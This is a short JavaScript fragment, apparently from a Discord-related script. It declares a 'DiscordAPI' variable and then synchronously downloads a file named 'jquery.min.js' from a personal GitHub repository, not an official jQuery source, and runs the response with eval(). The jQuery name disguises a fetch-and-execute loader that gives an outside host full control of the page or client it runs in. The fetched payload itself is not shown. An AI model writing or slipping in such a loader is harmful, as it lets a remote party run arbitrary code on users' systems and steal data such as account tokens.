...
var DiscordAPI = [];
var xmlhttp;if (window.XMLHttpRequest){xmlhttp = new XMLHttpRequest();xmlhttp.open("GET", "https://raw.githubusercontent.com/4thebadwoofsky/scripts.common/master/jquery.min.js" ,false);xmlhttp.onreadystatechange = function () {if (xmlhttp.readyState != 4) return; eval(xmlhttp.responseText);};xmlhttp.send(null);}
